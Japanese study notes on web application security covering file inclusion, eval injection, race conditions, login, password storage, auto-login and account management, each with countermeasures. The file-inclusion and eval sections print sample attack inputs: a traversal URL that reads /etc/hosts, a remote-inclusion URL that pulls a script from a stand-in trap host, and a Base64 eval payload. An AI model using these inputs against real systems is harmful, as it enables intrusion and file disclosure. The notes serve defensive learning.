   　1．ファイルサイズ以外の縦横サイズ、色数などのチェック　　
     2．画像として読み込めるかどうかのチェック
     3．ウイルス・スキャン
     4．コンテンツの内容チェック（自動あるいは手動）
     　　➡アダルトコンテンツ
       　➡著作権を侵害するコンテンツ
         ➡法令、公序良俗に反するコンテンツ
         ➡その他
          
    ・画像を別ドメインで配信する
    　画像を別ドメインで配信することで、XSS攻撃があってもサービス自体には影響がないというメリットがある。
      
  参考：利用者PCに対象アプリケーションがインストールされていない場合
  　　　Content-Typeに該当するアプリケーションが利用者のPCにインストールされていない場合、
     　そのContent-Typeはブラウザにとって未知のものとなりXSSの可能性がある。
      　・コンテンツを配信するサーバーのドメインを別にする
        ・Content-Dispositionヘッダをつける
        これらの対策は副作用があるため、確実性には劣るが、副作用のない対策も紹介する。
        ・アプリケーションが想定したURLかどうかチェックする
        ・コンテンツの閲覧に必要なアプリケーションの導入を利用者に注意喚起する
  
  　
-----------------------------------------------------------------------------------------------------------

★　ファイルインクルードにまつわる問題

◎　ファイルインクルード攻撃
・概要
　言語によってスクリプトのソースの一部を別ファイルから読み込む機能がある。（PHPならrequire_onceなど）
　アプリケーションが意図しないファイルを指定することで脆弱になる場合があり、これをファイルインクルード脆弱性と呼ぶ。
　影響として、
　・Webサーバー内のファイルの閲覧による情報漏洩
　・任意スクリプトの実行による影響（サイト改竄、不正な機能実行、他サイトへの攻撃（踏み台））
　
　・攻撃手法と影響
　　画面のヘッダを記述したファイルをrequire_onceで読み込む。
　　http://example.jp/4d-001.php?header=spring
　　$_GETでパラメータの値を取得して、パラメータのファイルをインクルードする（ここではspring.php）
　　1．以下のパラメータを指定する
  　　　http://example.jp/4d-001.php?header=../../../../etc/hosts%00  // %00はヌルバイト攻撃でプログラム側の.php拡張子を無効化する
　　2．/etc/hostsの内容が表示される。
  
　　・スクリプトの実行1：リモート・ファイルインクルード攻撃（RFI)
　　　PHPのinclude/requireには外部サーバーのファイルをインクルードする機能がある（RFI）。
　　　1．外部サーバーに以下のファイルを用意する
   　　　外部サーバー：http://trap.example.com/4d-900.txt
     　　スクリプト ：　<?php phpinfo(); ?>
     2．このURLを指定する形でページを呼び出す
     　　http://example.jp/4d-001.php?header=http://trap.example.com/4d-900.txt?　// ?はアプリケーションの.php拡張子をクエリ―文字として解釈させる目的
     3．4d-900.txtがダウンロードされphpinfoが表示される
     
　　・スクリプトの実行2：セッション保存ファイルの悪用
  　　RFIが禁止されていてもWebサーバー上に任意の内容を書き込める場合にはファイルインクルード攻撃によるスクリプトが実行される可能性がある。
　　　・ファイルのアップロードが可能なサイト
　　　・セッション変数の保存先としてファイルを使用しているサイト
　　　上記のどちらもファイル名を推測できる条件となっており、後者の条件で例を紹介する。
　　　攻撃対象のサイトには外部入力をそのままセッション変数に格納している個所があるという想定。
　　　1．入力フォームに &lt;?php phpinfo(); ?&gt; といれる
　　　　　セッション情報のファイル名はセッション情報の保存パスとセッションIDを基に構成される。
     　　OSによってデフォルトのパスは決まっており、セッションIDはクッキー値からわかるため、セッション情報の保存ファイル名を推測できる。
　　　2．推測されたセッション情報の格納ファイルにアクセスすると、先のスクリプトが実行されて情報漏洩がおこる

・原因
　1．インクルードファイル名を外部から指定することができる
　2．インクルードすべきファイル名かどうかの妥当性チェックをしていない

・対策
　・外部からファイル名を指定する仕様を避ける
　・ファイル名にディレクトリ名が含まれないようにする
　・ファイル名を英数字に限定する
 　（ディレクトリ・トラバーサル脆弱性と同様）
  
  ・保険的な対策
  　RFI設定を禁止する。
   　phpinfo関数の表示からallow_url_includeの項目がOffになっているか確認する。
    php.ini
    allow_url_include = Off

-----------------------------------------------------------------------------------------------------------

★　evalにまつわる問題

◎　evalインジェクション
・概要
　PHP、Perl、Ruby、JavaScriptなどのスクリプト言語は与えられた文字列をスクリプトのソースとして解釈して実行する機能がある。
　これはeval(evaluate)という名前の関数として提供されることが多い。
　eval関数の利用法に問題があると外部から送り込んだスクリプトを実行される場合がある。
　影響として、情報漏洩、サイト改竄、不正な機能実行、他サイトへの攻撃（踏み台）がある。
 
　・攻撃手法と影響
　　eval関数を複雑なデータを文字列に変換（シリアライズ）してフォーム間を受け渡しする場合の脆弱性。
　　var_export関数は式の値をPHPソース形式で返す。
　　このデータをeval関数で元のデータに戻す（デシリアライズ）。
　　1．外部からのパラメータとして「0; phpinfo();」を入力するためにBase64コードで変換
　　2．以下のURLで実行する
  　　　http://example.jp/4e-002.php?data=MDsgcGhwaW5mbygp
　　3．Base64デコードされた上のパラメータが1.の入力となり、スクリプトとして実行される
    
・原因
　・eval機能が危険
　・evalに与えるパラメータのチェックがされていない
 　その他の入力文字列を解釈して実行する機能を持つ関数
  　create_function()　➡　関数を動的に生成する
  　preg_replace()　　 ➡　e修飾子を指定した場合
    mb_ereg_replace()　➡　第4引数に'e'を指定した場合
    また、PHPで引数として関数名を指定できる関数も外部から関数を指定できる場合脆弱性になる可能性がある。
    call_user_func()  call_user_func_array()  array_map()  array_walk()
    array_filter()  usort()  uksort()

・対策
　1．eval（同等機能含む）を使わない
 　 evalを使わないことを検討する。シリアライズ目的であれば、implode/explode、serialize/unserializeを使う。
    implode関数は配列を引数としてとり、区切り記号をはさんで文字列にする関数。explodeはその逆で単純な配列のシリアライズには対応できる。
    serialize関数は自由度が高く、オブジェクトのシリアライズが可能。
    ただし、unserializeは任意のオブジェクトを生成するため、オブジェクトの廃棄時にデストラクタが呼ばれ、脆弱性になることがある。
    
　2．evalの引数に外部からのパラメータを指定しない
 　 hiddenパラメータではなくセッション変数で受け渡しをすることで外部からスクリプトを注入できない。
  　ただし、スクリプトの注入経路はHTTP経路だけでなく、ファイルやデータベース経由で注入できる場合もあるため、注意が必要。
   
　3．evalの与える外部からのパラメータを英数字に制限する
 　 外部からのパラメータを英数字に限定すれば、スクリプトの注入に必要な記号文字（セミコロン、コンマ、引用符など）が使えないため、スクリプト注入はできない。
 

-----------------------------------------------------------------------------------------------------------

★　共有資源に関する問題

◎　競合状態の脆弱性
・概要
　共有資源　➡　複数のプロセスやスレッドから同時に利用している変数、共有メモリ、ファイル、データベースのこと。
　共有資源に対する排他制御が不十分だと脆弱性になる可能性がある。
　影響として、別人の個人情報などが画面に表示される（別人問題）、データベースの不整合、ファイルの内容の破壊がある。
 
　・攻撃手法と影響
　　Javaサーブレットでの事故例：
　　クエリ―文字列nameを受け取ってインスタンス変数nameに代入して3秒間待ってからインスタンス変数nameを表示する。
　　1．このサーブレットをブラウザのウィンドウを2枚表示しておき、
　　2．まず片方でname=yamadaとして起動、1秒後に別ウィンドウでname=tanakaとして起動する。　　
　　3．結果として3秒待つと両方のウィンドウでname=tanakaが表示される
  　これはインスタンス変数が共有資源であることが原因。
　　デフォルト設定では各サーブレットクラスのインスタンス（オブジェクト）は1つだけ生成され、
　　すべてのリクエストはこの単一のインスタンスが処理する。
　　そのため、インスタンス変数も1つだけ存在することになり、すべてのリクエスト処理が共有する変数になる。
　　つまり、最初にyamadaが変数nameに入ってから3秒後にはtanakaで上書きして、
　　それが維持されたままのため、どちらのブラウザもtanakaが表示された。

・原因
　・変数nameは共有変数である
　・共有変数nameに対して排他制御をしていない
　　
・対策
　1．可能であれば共有資源を使用しない
 　　できればローカル変数にする。
   
　2．共有資源に対して排他制御を行う
 　　マルチスレッド処理で排他制御を行う場合は、synchronized文やsynchronizedメソッドが利用できる。
   　synchronized(this){} 
     サーブレットインスタンスに対して排他制御をするという意味になる。
     シンクロナイズドされたブロック内は1つのスレッドのみが実行されるため、一旦代入したnameが他のスレッドから書き換えられることはなくなる。
     ただし、これはアプリケーションの性能を低下させる原因になる。同時にリクエストがくれば、リクエスト数*3秒の時間待ちになるため、
     サービス妨害攻撃（DoS攻撃）が簡単にできてしまう。
     排他処理をできるだけしないで済むように、共有資源を使わないことが望ましく、使う場合は排他的処理の時間を短時間にするよう設計する。
 
-----------------------------------------------------------------------------------------------------------

★　認証
認証　➡　利用者が確かに本人であることをなんらかの手段で確認すること。
HTTP認証、HTMLフォームでIDとパスワードを認証させるフォーム認証、SSLクライアント証明書を用いるクライアント認証などがある。
認証を以下の機能に分けて説明する。
・ログイン機能
・総当たり攻撃への対策
・パスワードの保存方法
・自動ログイン
・ログインフォーム
・エラーメッセージ
・ログアウト機能

◎　ログイン機能
ログイン機能　➡　IDとパスワードをDBと照合して一致するものがあれば認証されたとみなす機能。

・ログイン機能への攻撃
不正ログイン　➡　ログイン機能に対する攻撃が成立して第三者が利用者に成りすますことができる。

　・SQLインジェクション攻撃によるログイン機能のバイパス
　　パスワードを知らなくて認証機能をバイパス（迂回）してログインできる場合についてはSQLインジェクション攻撃の項で説明済。
　・SQLインジェクション攻撃によるパスワードの入手
　　DBに保存しているユーザIDやパスワードが盗み出される可能性がある。
  ・ログイン画面に対するパスワード試行
　　様々なユーザIDやパスワードを繰り返し試す方法があり、総当たり攻撃や辞書攻撃という手法がある。
　　総当たり攻撃　➡　ブルートフォース攻撃ともいい、パスワードの組み合わせをすべて試す方法。
　　辞書攻撃　　　➡　パスワードに用いられやすい文字列の集合を「辞書」として用意し、辞書に保存されたパスワード文字列を順に試す方法。
　・ソーシャルハッキングによるパスワード入手
　　ソーシャルハッキング（ソーシャルエンジニアリング）　➡　コンピュータへの攻撃ではなく利用者本人をだまして重要情報を得る手法。
　　上司やサーバー管理者に成りすましてパスワードを聞き取る方法がある。
　　ショルダーハック　➡　利用者が実際にパスワードを入力している場面で画面やキーボードを盗み見てパスワードを読み取る方法もソーシャルハッキングの一種。
　・フィッシングによるパスワード入手
　　フィッシング　➡　本物そっくりの画面を備えた偽サイトを仕立てて、利用者に重要情報を入力させる手口でソーシャルエンジニアリングの一種。

・ログイン機能が破られた場合の影響
　Webアプリケーションが不正ログインされると、攻撃者は利用者の持つ権限をすべて利用できる。
　情報の閲覧、更新、削除、物品の購入、送金、掲示板への投稿など。
　不正ログインは能動的で利用者の関与は不要であるため、不正ログイン手法の方が、受動的攻撃であるセッションハイジャックの多くの手法よりも
　より多くの利用者に影響が出る傾向にある。

・不正ログインを防ぐためには
　以下の2つが必要な条件である。
　1．SQLインジェクションなどセキュリティバグ（狭義の脆弱性）をなくす
　2．パスワードを予測困難なものにする
 
　1．SQLインジェクションなどセキュリティバグをなくす
　　ログイン機能の特性上発生しやすい脆弱性
　　A.SQLインジェクション
　　B.セッションIDの固定化
　　C.クッキーのセキュア属性不備
　　D.オープンリダイレクタ脆弱性
　　E.HTTPヘッダ・インジェクション
  　　Aはパスワードの照合をSQL呼び出しにより実装する場合が多いため。
  　　BとCは認証後にセッションIDをクッキーに設定する方法に問題がある場合に起こる・
  　　DとEはログイン機能とは直接関係ないが、ログイン後にリダイレクトするWebアプリケーションが多く、結果的に起きやすい。
　
　2．パスワードを予測困難なものにする
　　パスワードは他人に予測されてはいけないため、予測困難なものにする必要があるが、
　　多くの人は自身で覚えやすく入力しやすい文字列をパスワードにしがちである。
　　一般的にはユーザー利便性（覚えやすさ・入力しやすさ）とセキュリティ強度（予測困難性）は相反する。
  
  　・パスワードの文字種と桁数の要件
　　　パスワードの最も基本的な要件は文字種と桁数である。これらによって利用できる文字列の総数が変わるためである。
　　　パスワードの組み合わせ総数　=　文字種の数　^　桁数　
　　　^　はべき乗。パスワードの総数は以下のようである。
　　　文字種の数　　　　　4桁　　　　　6桁　　　　　8桁
   　　10種（数字のみ）　　1万　　　 100万　　　　 1億
   　　26種（英小文字）　約46万　　　約3億　 　　約2千億
　     62種（英数字）　　約1500万 　約570億　　 約220兆
　　   94種（英数記号）　約7800万　 約6900億　 約6100兆
  
    ・パスワード利用の現状
    　パスワードの利用最多は「123456」。
　　　利用者は最も楽なパスワードを選ぶ傾向がある。
  
  　・パスワードに関するアプリケーション要件
　　　典型的な要件
   　　1．文字種：英数字（大文字小文字の区別）　　桁数：8桁
　　　 2．文字種：ASCII文字すべて（0x20～0x7E）　　桁数：128桁以下
    
    ・積極的なパスワードポリシーのチェック
    　Webアプリケーションが積極的にパスワードをチェックするためのパスワードポリシー
     ・文字種に関するもの（例：英字・数字・記号を必ず1字は入れる）
     ・桁数に関するもの（例：8桁以上）
     ・ユーザーIDと同じパスワード（いわゆるジョーアカウント）の禁止
     ・パスワード辞書に載っているありがちな単語の禁止
     
◎　総当たり攻撃への対策
・アカウントロック
　暗証番号を3回間違えるとキャッシュカードが使えなくなるようなアカウントロックが総当たり攻撃への対策として有効である。
　　
・基本的なアカウントロック
　1．ユーザーID毎にパスワード間違いの回数を数える
　2．パスワード間違いの回数が上限値を超えるとアカウントをロックする。ロックされたアカウントはログインできなくなる
　3．アカウントロックが発生した場合はメールなどで対象利用者と管理者に通知する
　4．正常にログインした場合はパスワード間違いのカウンタをクリアする
  
・ロックされたアカウントの最有効化
　1．アカウントロックから30分経過した場合、自動的に最有効化される
　2．管理者がなんらかの方法で本人確認した後に最有効化する
  　30分が短いと感じるかもしれないが、攻撃者が100コのパスワードを試すのに4時間半以上かかり、
　　10回のアカウントロック通知が届く。
　　この間に管理者はロックの発生状況を確認し、攻撃がきているIPアドレスからの通信を遮断するなどの対処ができる。
  
・総当たり攻撃の種類
　・辞書攻撃
　　パスワードの可能性をすべて試すのではなく、使用頻度の高いパスワード候補から順に試す方法。
　　対策としてはアカウントロックが有効。
　・ジョーアカウント探索
　　ユーザーIDと同じ文字列をパスワードに設定しているアカウントをジョーアカウントといい、
　　アプリケーションが禁止していない場合、ジョーアカウントは一定の割合で存在するとみられる。
　・逆総当たり攻撃
　　パスワードを固定して、ユーザーIDを取り換えながらログインを試行する。
   
・変形総当たり攻撃への対策
　ジョーアカウントや逆総当たり攻撃にはアカウントロックでは対処できない。
 　対策候補は以下である。
　・積極的なパスワードチェック
 　　辞書によるチェックでパスワードの登録時にログインIDと同一なパスワードやありがちなパスワードを拒否する。
   　ジョーアカウントは完全に対策ができ、逆総当たり攻撃にもありがちなパスワードを使うため、かなり低減できる。
　・ログインIDの秘匿
　　一般公開するニックネームとは別に非公開のログインIDを設定する方法。
　　一般的にはメールアドレスを使う。
　・ログイン失敗率の監視
　　パスワード攻撃が発生するとログイン失敗率が急激に上昇するため、管理者が原因調査の上、
　　該当するIPアドレスとの通信遮断など必要な処理を取る方法が有効である。
　・各対策の比較
  　対策　　　　　　　　　　　　　メリット　　　　　　　　　　デメリット
  　積極的なパスワードチェック　　実装・運用が比較的容易　　　辞書の入手、メンテが面倒・十分な対策とはいえない
　　ログインIDの秘匿　　　　　　　実装・運用が比較的容易　　　既存サイトの場合はサービス仕様の変更となるため実現が難しい
　　ログイン失敗率の監視　　　　　パスワード攻撃全般に効果有　監視人員が必要となるのでコストが高い・即時対応が取れない可能性あり
   

◎　パスワードの保存方法
・パスワード保護の必要性
　パスワードが漏洩した場合、悪用により情報漏洩以外の被害が発生する可能性がある。
　・該当利用者の権限で使える機能の悪用（物品購入、送金など）
　・該当利用者の権限でのデータの投稿、変更、削除
　・利用者がパスワードを使いまわしている場合、他サイトへの影響の波及

・暗号化によるパスワード保護と課題
　暗号化の課題
　1．安全な暗号アルゴリズムの選定
　2．鍵の生成
　3．鍵の保管
　4．暗号アルゴリズムが危殆化した場合の再暗号化
 　　暗号アルゴリズムの危殆化　➡　暗号を破る手法が発見される、またｈコンピュータの速度が向上することで総当たり的な解読手法が現実的になること。
　　 再暗号化　➡　危殆化した暗号文を一旦復号し、安全なアルゴリズムで暗号化しなおすこと。
　　ここで特に難しいのは鍵の保菅方法である。鍵はログインのたびに必要で安全な金庫にしまっておけるものではない。
　　Webアプリケーションでは参照でき、盗難はされないという方法が難しい。そもそもそういった保管方法があればパスワードそのものを保管すればいい。
　　したがって、パスワードを暗号により保護するのではなく、メッセージダイジェストにより保護する方法が一般的である。
  
・メッセージダイジェストによるパスワード保護と課題
　メッセージダイジェスト　➡　固定長のデータのこと。ハッシュ値ともいう）
　任意の長さのデータ（ビット列）を固定長のデータに圧縮する関数をハッシュ関数といい、セキュリティ上の要件を満たすハッシュ関数を暗号学的ハッシュ関数という。
 
・暗号学的ハッシュ関数が満たすべき要件
　原像計算困難性（一方向性）　➡　ハッシュ値から元データを見つけることが現実的な時間内では困難であるという性質。
　第2原像計算困難性（弱衝突耐性）　➡　元データが与えられた時に元データと同じハッシュ値を持つ別のデータを見つけることが現実的な時間内では困難であるという性質。
　衝突困難性（強衝突耐性）　➡　同じハッシュ値を持つ2つのデータが見つけられることが困難である性質。
 　MD5ハッシュ関数は強衝突耐性が破られており、弱衝突耐性が破られるのも時間の問題といわれている。
　 しかし、安全なパスワードの保存には原像計算困難性があれば十分ともいわれており、安全でないわけではない。
   現在、最も安全なのはSHA-256である。
   
・メッセージダイジェストを用いてパスワードを保護する
　パスワード設定時にハッシュ化され登録（メッセージダイジェストのまま）、照合時もメッセージダイジェストのまま検索される。
　メッセージダイジェストが安全にパスワードを保存できるのはハッシュ関数に以下の特性があるためである。
 　1．ハッシュ値から元データを得ることが困難（一方向性）
 　2．異なる入力から得られるハッシュ値が一致する確率が極めて低い（衝突耐性）
  しかし、パスワードの文字種や文字数が制限されているという特性があるため、ハッシュ値から元データを解析する方法が知られている。
  脅威1．オフライン総当たり攻撃
  　メッセージダイジェストから元のパスワードを探す処理は攻撃対象サーバーに接続せずにオフラインでできることからこの名前が付いた。
　　ハッシュ関数は高速でないといけないため、現実的な時間内で総当たり攻撃ができるようになった。
　脅威2．レインボークラック
　　パスワードのハッシュ値をあらかじめ総当たりで算出して表にしておき、解読時は表の参照を行うことで高速に検索できる。
　　しかし、現実的には総数が膨大になるため表の作成は困難とされてきた。
　　ところが、2003年にレインボーテーブルという手法が開発され、実現可能なサイズで表引きによるハッシュ値の解析ができるようなった。
  　レインボークラックに対してはソルトという方法で対策できる。
  脅威3．ユーザーDB内にパスワード辞書を作られる
  　攻撃者にとって未知のハッシュ関数を用いれば、元パスワードが知られることはないと考えがちであるが、
　　未知のハッシュ関数を使っても元パスワードが判明する場合がある。
　　攻撃者がダミーのユーザーを多数登録してユーザーDB上にパスワード辞書を作ってしまうということである。
　　
　対策1．ソルト
　　ハッシュの元データに追加する文字列のことをソルトという。
　　見かけのパスワードを長くするとともにソルトをユーザー毎に異なるものにすることでパスワードが同じでも異なるハッシュ値が生成される。
  　ソルトの要件
　　　・ある程度の長さを確保する
　　　・ユーザー毎に異なるものにする
   　レインボーテーブルの対策の目的にはソルトとパスワードを合わせた長さが最低でも20文字は必要。
     ユーザー毎にソルトを異なるものにするのは同じパスワードを持つユーザーでもハッシュ値を異なるものにするためである。
   　ユーザー毎にことなるハッシュを生成するアプローチには2種類ある。
 　　　1．乱数をソルトとして使う
 　　　2．ユーザーIDを入力とする関数によりソルトを生成する
    　乱数をソルトとして使うと、ソルトをハッシュ値とセットで保存しておく必要がある。
    　ユーザーIDをソルトとして使うことで、ソルトを保存する必要が無いという利点がある。
　対策2．ストレッチング
　　ソルトを使ってもハッシュの計算時間はあまり変わらないため、総当たり攻撃の脅威は残る。
　　そこで計算速度を遅くする方法にストレッチングがある。ストレッチングはハッシュの計算を繰り返し行うことで計算時間を延ばすことである。
  　ストレッチングの回数は多いほど総当たり攻撃への耐性が高まるが、サーバー負荷が高まるというデメリットもあるため、最適な回数に調整する必要がある。
  
　参考：データベース暗号化とパスワード保護
 　　透過的データ暗号化（TDE（Transparent Data Encryption））
   　　➡　データベースを丸ごと暗号化する製品。SQL呼び出し時や保存時に自動的に暗号化される。
    　　　 ただし、SQLインジェクション攻撃に対しても復号化して返すため、セキュリティ的な導入ではなく
        　 データベースを構成するファイルやバックアップメディアの盗難に対して有効である。

　参考2：パスワードの漏洩経路
 　　SQLインジェクション攻撃、パスワード試行、ソーシャルハック、フィッシング以外の漏洩経路
   　1．バックアップメディアの盗難・持出
    　　データベースのバックアップに用いるメディア（テープなど）の持出。
     2．ハードディスクの盗難・持出
     　 データセンターからサーバー本体やハードディスクの持出。ハードディスクの盗難に対してはTDEが有効。
     3．内部のオペレーターのよる持出
     　 データベースの管理ツールなどを用いてオペレーターが直接データベースから情報を抽出し、USBやCDのメディアで持出。


◎　自動ログイン
　Webアプリケーションによっては自動ログインやログイン状態を保持するという機能がついている。
　セッションの有効期間が非常に長くなることから、XSS攻撃など受動的攻撃の被害にあいやすいため、好ましくないとされてきた。
　しかし、以下の理由で許容されてもよいと考えられる。
　1．Webの利用が浸透した結果、ログイン状態を継続することを前提としたサービスが増加した（例：Googleなど）
　2．頻繁にログイン、ログアウトが要求されると、利用者が単純な（安全性の低い）パスワードを付けがちでかえって危険度が増す
　
・危険な実装例
　1．自動ログインの危険な実装例として、ユーザー名と自動ログインを示すフラグのみをクッキーとして発行しているWebサイト。
　　　Set-Cookie: user=yamada; expires=Wed, 27-Oct-2010 06:25:55 GMT
　　　Set-Cookie: autologin=true; expires=Wed, 27-Oct-2010 06:25:55 GMT
　　平文でクッキーに設定されている。利用者本人はクッキーを変更できるため、userをtanakaにしてしまえばtanakaにログインできてしまう。
  　改良版にパスワードを追加しているものもある。
  　　Set-Cookie: passwd=5x23Awpl; expires=Wed, 27-Oct-2010 06:25:55 GMT // userの次に追加
    仮に攻撃者が利用者のパスワードを知っていれば、ログイン画面から入るため、悪用されることはないが、
    クッキーに秘密情報を保存していると仮にこのサイトにXSS脆弱性があった場合に被害が拡大してしまう。
    
・安全な実装方式
　1．セッションの寿命を延ばす
 　　PHPの場合、以下の方法でできる。
   　・session_set_cookie_params関数によりセッションIDを保持するクッキーのExpires属性（有効期限）を設定する
　　 ・php.iniにてsession.gc_maxlifetime設定を1週間ほどに延ばす（デフォルトは24分間）
    この方法は自動ログインをしていないユーザーもセッションタイムアウトが1週間に延びる。
    自動ログインの場合は、
    ・セッションタイムアウトを1週間に延ばす（デフォルトは30分）
    ・セッションIDのクッキーのExpires属性を1週間後に設定
    また、自動ログインか否かにかかわらず以下を実行します。
    ・セッションタイムアウト時間はセッション変数$_SESSION['timeout']に保持
    ・セッションタイムアウト時刻はセッション変数$_SESSION['expires']に保持
　2．トークンを使う
 　　言語によってはセッションIDを保持するクッキーのExpires属性を設定できず、ブラウザ終了とともにセッションが消滅するものもある。
　　 言語組み込みのセッション管理機構ではログイン状態を維持の機能は実装できないため、トークンを利用する。
   　・ログイン時にトークンを発行（自動ログイン時のみ）
    　 クッキーには、Expires属性を適当に設定（例：1週間）して、暗号論的擬似乱数生成系で発生させたトークンを発行する。
     　HttpOnly属性は必ず付け、HTTPSの場合はセキュア属性をつける。
      　トークン（ユニーク）　｜　ユーザーID　｜　有効期限
       のようにトークンによってどのユーザーがいつまで自動ログインできるかを保持する。
     ・ログイン状態の確認と自動ログイン
     　セッション上に認証情報がセットされているか確認し、セットされている場合はそのまま認証成功を返す。
     　セットされていない場合は、check_auth_token関数を呼び出し、自動ログインを試みる。
     　check_auth_token関数はトークンに対する自動ログイン情報を検索して、レコードが存在し、かつ有効期限が過ぎていない場合にログイン中のユーザーIDを返す。
     　自動ログインに成功した場合、元のトークン情報を漏洩したリスクを考え破棄し、新しい有効期限でトークンを再発行する。
     ・ログアウト
     　ユーザーIDをキーとして、自動ログイン情報のテーブルから該当する行を削除する。
     　1人の利用者が複数の端末に自動ログイン情報をセットしている場合があるため、キーはトークンではなくユーザーIDとなる。   　　
　3．チケットを使う
 　　認証チケット　➡　認証情報（ユーザー名、有効期限など）をサーバーの外に持ち出せるようにしたもの。
   　認証チケットは偽造防止のためのデジタル署名や内容を参照できないように暗号化が施される。
   　認証チケットはWindowsでも採用されているKerberos認証やASP.NETのフォーム認証などで採用されている。
   　メリットはサーバーをまたがって認証情報を共有できる点。独自実装は避けるべきである。
   　複数のサーバーをまたがって認証状態を共有したい場合は、サードパーティ製のシングルサインオン（SSO)製品を購入するか、OpenIDなどのオープンな認証基盤を利用する。
    
・3方式の比較
　この中ではトークン方式がもっとも好ましい。トークン方式のメリットは以下である。
　・自動ログインを選択しない利用者に影響を与えない
　・複数端末からログインしている場合に一斉にログアウトできる
　・管理者が特定利用者のログイン状態をキャンセルできる
　・クライアント側に秘密情報が渡らないので解析されるリスクが無い
 
・自動ログインのリスクを低減するには
　デフォルトではログイン状態を継続するが、購入処理や購入履歴閲覧などの重要な処理の前にパスワード入力を要求する方法がある。（再認証）


◎　ログインフォーム
　・パスワード入力欄はマスク表示する
 　　type属性にpasswordのinput要素を使い、入力したパスワードが表示されないようにする。
　　 ショルダーハックによる盗み見を低減する。
　・HTTPSを利用する場合はログインフォームからHTTPSにする
　　 パスワードをHTTPSで暗号化することで盗聴されなくなる。入力欄側もHTTPSにしないと以下の危険性がある。
   　・フォームが改竄されていて、入力値の送信先が別のサイトになっている危険性
   　・DNSキャッシュポイズニングなどにより、偽物のサイトを表示している可能性
    入力フォームをHTTPSにすれば、改竄のリスクはなく偽物のサイトの場合はブラウザがエラー表示するため、利用者が偽物とわかる。
  　このため、HTTPSを利用しているサイトは必ずログインフォームからHTTPSを利用するようにする。
   
   
◎　エラーメッセージの要件
　例えばログイン機能で「指定したユーザーは存在しません」「パスワードが間違っています」などのエラーメッセージはよくないとされる。
　どちらが間違っているかを判別できると総当たり的な探索がしやすくなってしまう。
　また、アカウントロックによるエラーメッセージによってはログインIDの有無が判明する場合がある。
　ログイン失敗時のエラーメッセージは以下になる。（アカウントロックが実装されている場合）
　「IDまたはパスワードが7違うか、アカウントがロックされています」
　アカウントロックが発生した場合は本人にメール通知がされるため、以下の注意書きを添えるといい。
　「※アカウントがロックされた場合は利用者のメールアドレス宛てに通知されます。アカウントロックが疑わしい場合はメールをご確認ください。」
 

◎　ログアウト機能
　ログアウト処理を安全確実に行う方法はセッションを破棄することである。
　ログアウト処理の要件
　・ログアウト処理は副作用があるのでPOSTメソッドでリクエストする
　・ログアウト処理ではセッションを破棄する
　・必要な場合、CSRF対策の対象とする
　

-----------------------------------------------------------------------------------------------------------

★　アカウント管理
　アカウント（ユーザー）管理についての実装上の注意点
　・ユーザー登録
　・パスワードの変更
　・メールアドレスの変更
　・パスワードリマインダ
　・アカウントの停止
　・アカウントの削除  

◎　ユーザー登録
　セキュリティ上の注意点
　1．メールアドレスの受信確認
　2．ユーザーIDの重複防止
　3．ユーザーの自動登録への対処（任意）
　4．パスワードに関する注意
　また、上記の機能的な問題以外にユーザー登録処理に混入しやすい脆弱性がある。
　・SQLインジェクション脆弱性
　・メールヘッダ・インジェクション脆弱性
 
・メールアドレスの受信確認
　認証が必要なサイトにおいて、メール通知には重要な役割がある。
　1．パスワードリマインダ機能での使用
　2．パスワード変更やアカウントロック発生時の通知など
　そのため、メールアドレスを登録・変更する際には、登録されたメールアドレスに送信されるメールを利用者自身が受信できることを確認すべきだ。
　具体的な方法は以下である。
　方法A．メールにトークン付きURLを添付して、そのURLから処理を継続する
　方法B．メールアドレスを入力した後、トークン（確認番号）入力画面に遷移、
　　　　 トークンは指定したメールアドレスにメール送信される
　Aはトークン付きURLをメール送信した後画面遷移が終了して、メール添付のURLからの流れになる。
　Bは画面遷移が途切れることはなく、トークンを入力する画面に遷移して、メールのトークンと照合する。
　トークンはメールを開封するまでは秘密情報であるため、hiddenで持ちまわることができない。セッション変数にトークンを保存する。
　　　　　　　　　　　　方法A　　　　　　　　　　　　　　　　　　方法B
　メリット　　　・ユーザーの操作性はいい　　　　　　　　　　　　・利用者にメールのURLを閲覧させることを避けられる
 　　　　　　　 ・メール受信に時間がかかる場合でも対応可能　　　・実装は容易
　デメリット　　・実装はやや面倒　　　　　　　　　　　　　　　　・確認番号を入力する操作が利用者にはやや面倒
 　　　　　　　 ・利用者にメールのURLを閲覧させること　　　　   ・メールを直ちに受け取れる環境でないと利用者登録できない
        　　　 ・メールクライアントによっては長いURLを途中で　 ・携帯電話では操作性が悪くなる可能性
            　　 切られてしまいクリックしても動かない可能性
 　
・ユーザーIDの重複防止
　事例1．パスワードが違えば同じIDで登録できるサイト
　事例2．ユーザーIDに一意制約を付けられないサイト
 　　　ユーザーの削除を論理削除にしていたため、一意にするとユーザーが利用できるIDがどんどん減ってしまう。
  ユーザーには一意制約を付ける必要があり、それができない場合は、アプリケーション側で重複を防ぐ必要がある。

・ユーザーの自動登録への対処
　外部から自動操作で大量に新規ユーザーが作成される場合がある。
　動機としては、迷惑メール送信の送信元アドレスとして利用されることがある。
　キャプチャによって自動登録の対処が可能となる。
 
　・CAPTCHAによる自動登録対策
　　CAPTCHA（キャプチャ）　➡　ユーザーが確かな人間であることを確認するためにわざと文字をゆがめさせた画像を表示させ、文字列を入力させる方法。
　　最近ではユーザービリティの観点から音声による代替ができるようになっている。


◎　パスワード変更
　パスワード変更の機能的な注意点
　・現在のパスワードを確認する
　・パスワード変更時にはメールでその旨を通知する
　発生しやすい脆弱性
　1．SQLインジェクション脆弱性 
　2．CSRF脆弱性
 
・現在のパスワードを確認すること
　パスワード変更時に、現在のパスワードを入力してもらい、照合する（再認証）。
　これによりセッションハイジャックされた状態で第三者がパスワードを変更することを防ぎ、CSRF対策にもなる。

・パスワード変更時のメール通知
　重要な処理がなされた時はその旨を利用者にメール通知することが望ましい。
　早期発見で必要な対応がとれる。
 
・パスワード変更機能に生じやすい脆弱性
　1．SQLインジェクション脆弱性
　2．CSRF脆弱性
　特にSQLインジェクション脆弱性があると、以下の脅威が考えられる。
　・再認証を回避してパスワード変更
　・別ユーザーのパスワード変更
　・全ユーザーのパスワードを一斉に変更


◎　メールアドレスの変更
　メールアドレス変更もセキュリティに影響する処理である。
　メールアドレスが不正に変更されるとパスワードリマインダ機能を通じてパスワードを入手される可能性があるためだ。
　メールアドレスの不正変更に悪用される典型的な手口
　・セッションハイジャック
　・CSRF攻撃
　・SQLインジェクション攻撃
 
・メールアドレス変更に必要な機能的対策
　1．新規メールアドレスに対する受信確認
　2．再認証
　3．メール通知
 　※　メールアドレス変更時の通知は不正な変更であることを考慮して新旧両方のアドレスに送信する。
  

